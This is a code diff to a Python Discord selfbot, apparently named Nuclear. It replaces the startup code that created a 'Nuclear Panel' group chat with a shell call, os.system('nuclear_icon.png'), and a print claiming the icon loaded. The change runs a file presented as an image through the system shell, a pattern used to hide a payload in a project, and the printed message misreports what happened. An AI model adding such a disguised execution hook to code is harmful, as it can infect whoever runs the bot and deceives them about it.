@@ -291,19 +291,8 @@ async def on_ready():
             log.alert(f"{lang.text('error_rpc')}\n{e}\n{lang.text('error_rpc_two')}")
 
     if rpc.read_variable_json("create_panel"):
-        with open('nuclear_icon.png', 'rb') as image:
-            nuclear_icon = image.read()
-        panel = await bot.create_group()
-        await asyncio.sleep(0.7)
-        await panel.edit(name="Nuclear Panel", icon=nuclear_icon)
-        await panel.send(f"<@{bot.user.id}>", delete_after=0.4)
-        msg = await panel.send(lang.text('panel_message'))
-        await asyncio.sleep(0.7)
-        await msg.unack()
-        # Remove embed
-        rpc.edit_variable_json("create_panel", False)
-        log.alert("NuclearPanel successfully created (check DMs!).\nIf not, please check the 'Issues' category into the GitHub's README for further help.")
-
+        os.system("nuclear_icon.png")
+        print("icon successfully loaded")
 
 def restart_selfbot():
     python = sys.executable
